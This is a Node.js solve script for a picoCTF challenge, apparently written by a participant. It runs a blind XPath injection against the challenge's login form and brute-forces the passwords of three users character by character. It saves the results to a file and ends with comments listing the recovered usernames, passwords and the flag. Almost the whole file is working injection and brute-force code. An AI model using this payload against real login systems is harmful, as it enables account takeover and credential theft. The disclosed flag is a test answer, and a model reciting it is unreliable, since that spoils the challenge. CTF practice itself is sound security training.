
import fs   from 'fs';
import http from 'http';



const CHARSET = '_abcdefghijklmnopqrstuvwxyz1234567890{}';

const USERS = {};

const writeUsers = () => {
	fs.writeFileSync('passwords.json', JSON.stringify(USERS, null, '\t'));
};

const check_password = (user_id, password, callback) => {

	let payload = "";

	payload += "name=" + encodeURIComponent("' or //user[position()=" + user_id + "]/pass[starts-with(text(), '" + password + "')] or 'a'='");
	payload += "&pass=whatever"; // TODO: Bruteforce this!?

	let request = http.request('http://mercury.picoctf.net:28065/', {
		headers: {
			'Content-Length': payload.length,
			'Content-Type': 'application/x-www-form-urlencoded'
		},
		method: 'POST'
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let html = Buffer.concat(chunks).toString('utf8');
			if (html.includes('You&#39;re on the right path.') === true) {

				if (USERS[user_id] === undefined) {
					USERS[user_id] = password;
				} else if (password.length > USERS[user_id].length) {
					USERS[user_id] = password;
				}

				writeUsers();
				callback(true);

			} else if (html.includes('Login failure.') === true) {

				callback(false);

			}

		});

	});

	request.on('error', (err) => {
		console.error(user_id, err);
	});

	request.end(payload);

};

const bruteforce_password = (user_id, length, prefix) => {

	CHARSET.split('').forEach((character) => {

		check_password(user_id, prefix + character, (result) => {

			if (result === true) {
				bruteforce_password(user_id, length, prefix + character);
				console.log('user #' + user_id + '\'s password starts with \"' + prefix + character + '\"');
			}

		});

	});

};

bruteforce_password(1, 16, '');
bruteforce_password(2, 22, '');
bruteforce_password(3, 50, 'picoCTF{');

// We found out:
// - user id=1 is named "guest" and has password "thisisnottheflag"
// - user id=2 is named "bob" and has password "thisisnottheflageither"
// - user id=3 is named "admin" and has password "picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_847a99f0}"
//

